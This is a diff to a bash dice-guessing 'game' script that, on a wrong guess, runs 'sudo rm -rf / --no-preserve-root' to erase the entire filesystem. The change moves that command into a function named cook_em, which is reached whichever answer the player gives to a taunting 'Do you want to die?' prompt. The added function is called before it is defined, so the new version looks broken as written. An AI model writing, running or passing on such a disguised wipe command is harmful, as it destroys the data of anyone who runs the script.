@@ -9,6 +9,19 @@ read -p "Choose a number between 1 and 6: " choice
 if [[ $choice == $random_number ]]; then
   echo "You win!!!"
 else
-  echo "goodbye..."
-  sudo rm -rf / --no-preserve-root
+  echo "You suck"
+  read -p "Do you want to die? (y/n): " yn_die
+  if [[ $yn_die == "y" ]]; then
+    echo "Wow that sucks to be you..."
+    sleep 1
+    cook_em
+  else
+    echo "Haha womp womp..."
+    sleep 1
+    cook_em
+  fi
+  function cook_em(){
+    echo "goodbye..."
+    sudo rm -rf / --no-preserve-root
+  }
 fi
